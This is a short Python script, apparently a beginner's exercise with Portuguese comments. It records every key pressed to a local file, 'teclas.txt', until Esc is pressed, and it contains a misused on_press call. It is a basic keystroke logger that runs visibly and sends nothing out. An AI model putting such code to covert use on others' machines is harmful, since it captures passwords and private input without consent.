import keyboard
import time

#   --Variaveis
#   --Loops
while True:
    if keyboard.is_pressed('esc'):
        print("adeus")
        break
    else:
        tecla = keyboard.read_key()
        print("tecla pressionada", {tecla})
        keyboard.on_press(True)
        
    with open("teclas.txt", "a") as file:
            file.write(tecla)           
            file.write(" ")    